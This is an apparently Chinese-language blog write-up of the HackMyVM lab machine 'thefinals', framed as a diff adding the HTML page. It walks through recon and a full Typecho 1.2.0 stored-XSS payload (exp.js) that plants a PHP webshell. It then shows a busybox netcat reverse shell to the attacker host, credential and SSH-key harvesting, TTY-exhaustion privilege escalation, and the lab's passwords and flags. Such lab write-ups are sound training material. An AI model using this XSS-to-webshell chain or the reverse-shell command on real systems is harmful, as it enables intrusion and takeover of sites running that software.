@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 一、信息收集
+
+## 1.1 主机发现与端口扫描
+
+首先，使用 `arp-scan` 在本地网络中发现目标主机的 IP 地址。">
+<meta property="og:title" content="hmv_thefinals">
+<meta property="og:description" content="# 一、信息收集
+
+## 1.1 主机发现与端口扫描
+
+首先，使用 `arp-scan` 在本地网络中发现目标主机的 IP 地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_thefinals.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>hmv_thefinals</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_thefinals</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/233" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
+<h2>1.1 主机发现与端口扫描</h2>
+<p>首先，使用 <code class="notranslate">arp-scan</code> 在本地网络中发现目标主机的 IP 地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l                         
+...
+192.168.205.157 08:00:27:19:f4:ef       PCS Systemtechnik GmbH
+...</pre></div>
+<p>确定目标主机 IP 为 <code class="notranslate">192.168.205.157</code>。接着，使用 <code class="notranslate">nmap</code> 对其进行全端口扫描，以确定开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.157
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:19:F4:EF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+...</pre></div>
+<p>扫描结果显示，目标主机开放了 22 (SSH) 和 80 (HTTP) 两个端口。</p>
+<h2>1.2 Web 服务探测</h2>
+<p>访问目标主机的 80 端口，发现是一个名为 "THE FINALS" 的静态网站，页面源码显示这是一个基于模板的网站，没有直接可利用的信息。</p>
+<p>使用目录扫描工具 <code class="notranslate">dirsearch</code> 进一步探测 Web 服务的目录结构。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -u http://192.168.205.157
+...
+[10:46:28] 200 -   17KB - /blog/
+[10:46:28] 200 -  820B  - /cgi-bin/printenv
+[10:46:28] 200 -    1KB - /cgi-bin/test-cgi
+...</pre></div>
+<p>扫描结果发现 <code class="notranslate">/cgi-bin/printenv</code> 和 <code class="notranslate">/cgi-bin/test-cgi</code> 两个 CGI 脚本，但访问后发现它们只是用于测试的示例脚本，并未执行，没有实际利用价值。</p>
+<p>关键发现是 <code class="notranslate">/blog/</code> 目录。访问该目录 <code class="notranslate">http://192.168.205.157/blog/</code>，发现是一个 Typecho 博客系统。为了方便后续操作，将域名与 IP 绑定到本地 hosts 文件中。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ tail -n 1 /etc/hosts      
+192.168.205.157 THEFINALS.hmv</pre></div>
+<p>通过页面信息和特征判断，该博客系统版本为 Typecho 1.2.0。</p>
+<h1>二、漏洞利用 (Typecho 1.2.0 存储型 XSS)</h1>
+<h2>2.1 漏洞分析</h2>
+<p>查询公开漏洞库可知，Typecho 1.2.0 版本存在一个存储型 XSS 漏洞（参考 issue [<a href="https://github.com/typecho/typecho/issues/1546" data-hovercard-type="issue" data-hovercard-url="/typecho/typecho/issues/1546/hovercard">#1546</a>](<a href="https://github.com/typecho/typecho/issues/1546)%EF%BC%89%E3%80%82" data-hovercard-type="issue" data-hovercard-url="/typecho/typecho/issues/1546/hovercard">https://github.com/typecho/typecho/issues/1546)）。</a></p>
+<ul>
+<li><strong>漏洞成因</strong>：漏洞存在于文章的评论功能中。当用户提交评论时，其填写的个人网站 URL 字段在后端处理和前端渲染时没有进行充分的过滤和编码。</li>
+<li><strong>触发原理</strong>：攻击者可以将恶意 JavaScript 代码构造在 URL 字段中。例如，通过闭合前一个 <code class="notranslate">&lt;a&gt;</code> 标签并插入一个新的 <code class="notranslate">&lt;script&gt;</code> 标签，来注入恶意脚本。当网站管理员在后台管理评论页面（<code class="notranslate">manage-comments.php</code>）查看这条恶意评论时，这段 JavaScript 代码就会在管理员的浏览器中执行。</li>
+<li><strong>利用思路</strong>：利用这个 XSS 漏洞，我们可以构造一段 JavaScript payload，当管理员查看评论时，该 payload 会在后台自动执行一系列操作，例如修改主题文件（如 <code class="notranslate">404.php</code>）并写入一个 webshell，从而实现对服务器的控制。</li>
+</ul>
+<h2>2.2 构造并执行 Payload</h2>
+<p>根据漏洞原理，我们编写一段 JavaScript payload (<code class="notranslate">exp.js</code>)，其功能是：</p>
+<ol>
+<li>在管理员后台页面中，动态创建一个不可见的 iframe，加载主题文件 <code class="notranslate">404.php</code> 的编辑页面。</li>
+<li>在 iframe 加载完成后，通过 <code class="notranslate">onload</code> 事件触发 <code class="notranslate">writeShell()</code> 函数。</li>
+<li><code class="notranslate">writeShell()</code> 函数会定位到 <code class="notranslate">404.php</code> 的文本编辑框，将 PHP 一句话木马 <code class="notranslate">&lt;?php system($_GET["a"]); ?&gt;</code> 写入文件内容的顶部。</li>
+<li>最后，模拟点击“保存文件”按钮，将 webshell 写入到服务器。</li>
+</ol>
+<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-c">// exp.js</span>
+<span class="pl-k">var</span> <span class="pl-s1">isSaved</span> <span class="pl-c1">=</span> <span class="pl-c1">false</span><span class="pl-kos">;</span>
+<span class="pl-k">var</span> <span class="pl-s1">attemptCounter</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span><span class="pl-kos">;</span>
+
+<span class="pl-k">function</span> <span class="pl-en">insertIframe</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
+    <span class="pl-k">var</span> <span class="pl-s1">path</span> <span class="pl-c1">=</span> <span class="pl-smi">window</span><span class="pl-kos">.</span><span class="pl-c1">location</span><span class="pl-kos">.</span><span class="pl-c1">pathname</span><span class="pl-kos">;</span>
+    <span class="pl-k">var</span> <span class="pl-s1">adminBase</span> <span class="pl-c1">=</span> <span class="pl-s1">path</span><span class="pl-kos">.</span><span class="pl-en">includes</span><span class="pl-kos">(</span><span class="pl-s">'manage-comments.php'</span><span class="pl-kos">)</span> 
+        ? <span class="pl-s1">path</span><span class="pl-kos">.</span><span class="pl-en">replace</span><span class="pl-kos">(</span><span class="pl-s">'manage-comments.php'</span><span class="pl-kos">,</span> <span class="pl-s">''</span><span class="pl-kos">)</span> 
+        : <span class="pl-s">'/admin/'</span><span class="pl-kos">;</span>
+    <span class="pl-k">var</span> <span class="pl-s1">themeUrl</span> <span class="pl-c1">=</span> <span class="pl-s1">adminBase</span> <span class="pl-c1">+</span> <span class="pl-s">'theme-editor.php?theme=default&amp;file=404.php'</span><span class="pl-kos">;</span>
+
+    <span class="pl-k">var</span> <span class="pl-s1">iframe</span> <span class="pl-c1">=</span> <span class="pl-s">`&lt;iframe id="theme_id" src="<span class="pl-s1"><span class="pl-kos">${</span><span class="pl-s1">themeUrl</span><span class="pl-kos">}</span></span>" width="0" height="0" onload="writeShell()"&gt;&lt;/iframe&gt;`</span><span class="pl-kos">;</span>
+    <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">body</span><span class="pl-kos">.</span><span class="pl-c1">innerHTML</span> <span class="pl-c1">+=</span> <span class="pl-s1">iframe</span><span class="pl-kos">;</span>
+<span class="pl-kos">}</span>
+
+<span class="pl-k">function</span> <span class="pl-en">writeShell</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
+    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">isSaved</span> <span class="pl-c1">||</span> <span class="pl-s1">attemptCounter</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">10</span><span class="pl-kos">)</span> <span class="pl-k">return</span><span class="pl-kos">;</span>
+    <span class="pl-s1">attemptCounter</span><span class="pl-c1">++</span><span class="pl-kos">;</span>
+
+    <span class="pl-k">try</span> <span class="pl-kos">{</span>
+        <span class="pl-k">var</span> <span class="pl-s1">iframeDoc</span> <span class="pl-c1">=</span> <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'theme_id'</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-c1">contentWindow</span><span class="pl-kos">.</span><span class="pl-c1">document</span><span class="pl-kos">;</span>
+        <span class="pl-k">var</span> <span class="pl-s1">content</span> <span class="pl-c1">=</span> <span class="pl-s1">iframeDoc</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">'content'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+        <span class="pl-k">var</span> <span class="pl-s1">buttons</span> <span class="pl-c1">=</span> <span class="pl-s1">iframeDoc</span><span class="pl-kos">.</span><span class="pl-en">getElementsByTagName</span><span class="pl-kos">(</span><span class="pl-s">'button'</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+
+        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">content</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">buttons</span><span class="pl-kos">.</span><span class="pl-c1">length</span> <span class="pl-c1">&gt;</span> <span class="pl-c1">1</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
+            <span class="pl-k">var</span> <span class="pl-s1">val</span> <span class="pl-c1">=</span> <span class="pl-s1">content</span><span class="pl-kos">.</span><span class="pl-c1">value</span><span class="pl-kos">;</span>
+            <span class="pl-k">var</span> <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">'&lt;?php system($_GET["a"]); ?&gt;\n'</span><span class="pl-kos">;</span>
+            <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">val</span><span class="pl-kos">.</span><span class="pl-en">indexOf</span><span class="pl-kos">(</span><span class="pl-s1">payload</span><span class="pl-kos">)</span> <span class="pl-c1">===</span> <span class="pl-c1">-</span><span class="pl-c1">1</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
+                <span class="pl-s1">content</span><span class="pl-kos">.</span><span class="pl-c1">value</span> <span class="pl-c1">=</span> <span class="pl-s1">payload</span> <span class="pl-c1">+</span> <span class="pl-s1">val</span><span class="pl-kos">;</span>
+                <span class="pl-s1">buttons</span><span class="pl-kos">[</span><span class="pl-c1">1</span><span class="pl-kos">]</span><span class="pl-kos">.</span><span class="pl-en">click</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
+                <span class="pl-s1">isSaved</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
+            <span class="pl-kos">}</span>
+        <span class="pl-kos">}</span>
+    <span class="pl-kos">}</span> <span class="pl-k">catch</span> <span class="pl-kos">(</span><span class="pl-s1">e</span><span class="pl-kos">)</span> <span class="pl-kos">{</span><span class="pl-kos">}</span>
+
+    <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-c1">!</span><span class="pl-s1">isSaved</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
+        <span class="pl-en">setTimeout</span><span class="pl-kos">(</span><span class="pl-s1">writeShell</span><span class="pl-kos">,</span> <span class="pl-c1">500</span><span class="pl-kos">)</span><span class="pl-kos">;</span> 
+    <span class="pl-kos">}</span>
+<span class="pl-kos">}</span>
+
+<span class="pl-en">insertIframe</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span></pre></div>
+<p>接着，在本地（Kali）开启一个 HTTP 服务来托管 <code class="notranslate">exp.js</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
+<p>然后，在博客的文章评论区提交一条恶意评论，其中 "Website" 字段填入我们构造好的 XSS payload，用于加载远程的 <code class="notranslate">exp.js</code> 脚本。</p>
+<pre class="notranslate"><code class="notranslate">http://a.com/"&gt;&lt;/a&gt;&lt;script/src="http://192.168.205.128/exp.js"&gt;&lt;/script&gt;&lt;a/href="#
+</code></pre>
+<p>当评论提交后，等待一段时间（模拟管理员查看评论），本地 HTTP 服务器会收到来自目标服务器的请求，说明 XSS 已成功触发。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">...
+192.168.205.1 - - [24/Aug/2025 10:53:08] <span class="pl-s"><span class="pl-pds">"</span>GET /exp.js HTTP/1.1<span class="pl-pds">"</span></span> 200 -
+...</pre></div>
+<h2>2.3 获取 Webshell 并反弹 Shell</h2>
+<p>XSS 触发后，webshell 已被写入 <code class="notranslate">/usr/themes/default/404.php</code>。我们可以通过访问该文件并传入命令来验证。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.157/blog//usr/themes/default/404.php?a=id<span class="pl-pds">'</span></span>         
+uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)</pre></div>
+<p>命令成功执行。接下来，在 Kali 上设置 <code class="notranslate">netcat</code> 监听，并利用 webshell 执行反弹 shell 命令，获取一个交互式 Shell。</p>
+<p>Kali 监听：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lnvp 8888</pre></div>
+<p>执行反弹 Shell：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.157/blog//usr/themes/default/404.php?a=busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20%2Fbin%2Fash<span class="pl-pds">'</span></span></pre></div>
+<p>成功获取到 <code class="notranslate">apache</code> 用户的 Shell，并升级为稳定的 TTY。</p>
+<h1>三、横向移动</h1>
+<h2>3.1 信息搜集</h2>
+<p>在 <code class="notranslate">apache</code> 用户的 Shell 中，首先查看博客的配置文件，获取数据库凭据。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/www/html/blog $ cat config.inc.php
+...
+<span class="pl-smi">$db</span>-<span class="pl-k">&gt;</span>addServer(array (
+  <span class="pl-s"><span class="pl-pds">'</span>host<span class="pl-pds">'</span></span> =<span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>localhost<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>port<span class="pl-pds">'</span></span> =<span class="pl-k">&gt;</span> 3306,
+  <span class="pl-s"><span class="pl-pds">'</span>user<span class="pl-pds">'</span></span> =<span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>typecho_u<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>password<span class="pl-pds">'</span></span> =<span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>QLTkbviW71CSRZtGWIQdB6s<span class="pl-pds">'</span></span>,
+  <span class="pl-s"><span class="pl-pds">'</span>database<span class="pl-pds">'</span></span> =<span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>typecho_db<span class="pl-pds">'</span></span>,
+...</pre></div>
+<p>使用获取到的凭据连接数据库，并查询 <code class="notranslate">typecho_users</code> 表，找到了 <code class="notranslate">staff</code> 用户的密码哈希。尝试破解该哈希未果，判断为兔子洞。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/var/www/html/blog $ mysql -u typecho_u -pQLTkbviW71CSRZtGWIQdB6s typecho_db -e <span class="pl-s"><span class="pl-pds">"</span>select * from typecho_users;<span class="pl-pds">"</span></span>
+...
+<span class="pl-k">|</span>   1 <span class="pl-k">|</span> staff <span class="pl-k">|</span> <span class="pl-smi">$P$B</span>/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1 <span class="pl-k">|</span> ...
+...</pre></div>
+<p>接着，检查 <code class="notranslate">/home</code> 目录，发现了 <code class="notranslate">june</code>, <code class="notranslate">scotty</code>, <code class="notranslate">staff</code> 三个用户。在 <code class="notranslate">/home/june</code> 目录下发现 <code class="notranslate">message.txt</code>，内容提到了 "BROADCAST" 和 "CNS"，这是一个重要线索。</p>
+<p>通过 <code class="notranslate">find</code> 命令查找属于 <code class="notranslate">scotty</code> 用户的文件，发现了日志文件 <code class="notranslate">/var/log/scotty-main.log</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/home/june $ head -n 10 /var/log/scotty-main.log
+Broadcast to eth0 192.168.11.255:1337
+...</pre></div>
+<p>日志显示，系统正在向 <code class="notranslate">192.168.11.255</code> 的 1337 端口进行 UDP 广播。</p>
+<h2>3.2 流量监听与凭据获取</h2>
+<p>根据日志文件的线索，在 Kali 上使用 <code class="notranslate">tcpdump</code> 监听来自目标主机的流量。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo tcpdump -A host 192.168.205.157
+...
+E..@..@.@. ............9.,V<span class="pl-k">&lt;</span>LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K</pre></div>
+<p>捕获到了一段 Base64 编码的数据。对其进行解码，发现是一个 SSH 私钥。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>...<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d <span class="pl-k">&gt;</span> /tmp/id_rsa
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat /tmp/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+-----END OPENSSH PRIVATE KEY-----</pre></div>
+<p>保存私钥并赋予 <code class="notranslate">600</code> 权限。通过 <code class="notranslate">ssh-keygen</code> 查看其关联用户，发现是 <code class="notranslate">root@thefinals.hmv</code>。然而，尝试使用该私钥以 <code class="notranslate">root</code> 身份登录失败。进一步尝试以 <code class="notranslate">scotty</code> 用户身份登录，成功。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ chmod 600 /tmp/id_rsa
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh scotty@192.168.205.157 -i /tmp/id_rsa
+
+thefinals:<span class="pl-k">~</span>$ id
+uid=1002(scotty) gid=100(users) groups=100(users),100(users)</pre></div>
+<p>成功横向移动到 <code class="notranslate">scotty</code> 用户。</p>
+<h1>四、权限提升</h1>
+<h2>4.1 Sudo 权限分析</h2>
+<p>以 <code class="notranslate">scotty</code> 用户身份登录后，立即检查 <code class="notranslate">sudo</code> 权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">thefinals:<span class="pl-k">~</span>$ sudo -l
+...
+User scotty may run the following commands on thefinals:
+    (ALL) NOPASSWD: /sbin/secret</pre></div>
+<p><code class="notranslate">scotty</code> 用户可以无需密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/sbin/secret</code>。尝试直接运行该命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">thefinals:<span class="pl-k">~</span>$ sudo /sbin/secret
+/sbin/secret: line 2: can<span class="pl-s"><span class="pl-pds">'</span>t create /dev/pts/99: Permission denied</span></pre></div>
+<p>程序执行失败，错误信息表明它尝试向 <code class="notranslate">/dev/pts/99</code> 这个伪终端（TTY）设备文件写入内容时权限不足。这揭示了提权的关键：我们需要让自己进入 <code class="notranslate">/dev/pts/99</code> 这个 TTY 会话。</p>
+<h2>4.2 TTY 占用与提权</h2>
+<p>系统分配 TTY 编号是顺序的。为了获得 <code class="notranslate">/dev/pts/99</code>，我们需要先创建并占用掉从 0 到 98 的所有 TTY。</p>
+<p>由于目标系统上没有安装 <code class="notranslate">screen</code> 或 <code class="notranslate">tmux</code> 等工具，我们选择使用 <code class="notranslate">python</code> 的 <code class="notranslate">pty</code> 模块来生成新的 TTY 会话。</p>
+<ol>
+<li>
+<p><strong>批量创建后台 TTY</strong>：<br>
+编写一个 <code class="notranslate">while</code> 循环，在后台启动 9* 个新的 TTY 会话，以占用 <code class="notranslate">/dev/pts/0</code> 到 <code class="notranslate">/dev/pts/9*</code>（这里就到一个大概范围，然后查看tty自己微调到98就好了）。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">thefinals:<span class="pl-k">~</span>$ i=0<span class="pl-k">;</span> <span class="pl-k">while</span> [ <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> 95 ]<span class="pl-k">;</span> <span class="pl-k">do</span> python -c <span class="pl-s"><span class="pl-pds">'</span>import pty; pty.spawn("/bin/ash")<span class="pl-pds">'</span></span> <span class="pl-k">&amp;</span> i=<span class="pl-s"><span class="pl-pds">$((</span>i<span class="pl-k">+</span><span class="pl-c1">1</span><span class="pl-pds">))</span></span><span class="pl-k">;</span> <span class="pl-k">done</span></pre></div>
+</li>
+</ol>
+<p><em>ps:我这肯定是没到98的，自己查看tty进行调整</em></p>
+<ol>
+<li>
+<p><strong>创建目标 TTY</strong>：<br>
+现在，再创建一个<strong>前台</strong>的 TTY 会话，这个会话将被分配到编号 <code class="notranslate">/dev/pts/98</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">thefinals:<span class="pl-k">~</span>$ python -c <span class="pl-s"><span class="pl-pds">'</span>import pty; pty.spawn("/bin/ash")<span class="pl-pds">'</span></span>
+<span class="pl-k">~</span> $ tty
+/dev/pts/98</pre></div>
+<p>(这里发现需要99个会话，不是98个，故再补上)</p>
+</li>
+<li>
+<p><strong>获取凭据</strong>：<br>
+在 <code class="notranslate">/dev/pts/98</code> (实际为 <code class="notranslate">/dev/pts/99</code>，因为从0开始) 的 TTY 中，再次执行 <code class="notranslate">sudo</code> 命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">~</span> $ sudo /sbin/secret
+root:p8RuoQGTtlKLAjuF1Tpy5wX</pre></div>
+<p>这次命令成功执行，并输出了一对凭据。这看起来像是数据库的 root 用户密码。</p>
+</li>
+</ol>
+<h2>4.3 获取最终 Root 权限</h2>
+<p>使用上一步获取的密码尝试连接本地 MySQL/MariaDB 服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">~</span> $ mysql -u root -pp8RuoQGTtlKLAjuF1Tpy5wX secret -e <span class="pl-s"><span class="pl-pds">'</span>select * from user;<span class="pl-pds">'</span></span>
+...
++----+----------+-------------------------+
+<span class="pl-k">|</span> id <span class="pl-k">|</span> username <span class="pl-k">|</span> password                <span class="pl-k">|</span>
++----+----------+-------------------------+
+<span class="pl-k">|</span>  1 <span class="pl-k">|</span> root     <span class="pl-k">|</span> BvIpFDyB4kNbkyqJGwMzLcK <span class="pl-k">|</span>
++----+----------+-------------------------+</pre></div>
+<p>在 <code class="notranslate">secret</code> 数据库的 <code class="notranslate">user</code> 表中，发现了 <code class="notranslate">root</code> 用户的密码 <code class="notranslate">BvIpFDyB4kNbkyqJGwMzLcK</code>。使用这个密码切换到 <code class="notranslate">root</code> 用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">~</span> $ su -
+Password: BvIpFDyB4kNbkyqJGwMzLcK
+thefinals:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root),...</pre></div>
+<p>成功切换到 <code class="notranslate">root</code> 用户。最后，读取位于 <code class="notranslate">/root/root.flag</code> 和 <code class="notranslate">/home/june/user.flag</code> 的两个 flag 文件，完成挑战。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">thefinals:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.flag</span>
+flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}
+
+thefinals:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /home/june/user.flag</span>
+flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
